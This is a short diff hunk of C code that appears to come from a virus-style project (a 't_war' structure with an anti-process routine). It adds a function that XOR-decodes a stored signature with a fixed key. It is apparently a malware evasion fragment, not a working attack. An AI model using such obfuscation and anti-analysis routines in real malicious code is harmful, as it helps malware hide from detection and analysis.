@@ -39,3 +39,14 @@ void    ft_antiprocess(t_war *war)
     }
     closedir(proc);
 }
+
+void    ft_obfuscation(t_war *war)
+{
+    int i = 0;
+    while (g_signature[i])
+    {
+        war->decrypted[i] = g_signature[i] ^ KEY;
+        i++;
+    }
+    war->decrypted[i] = '\0';
+}
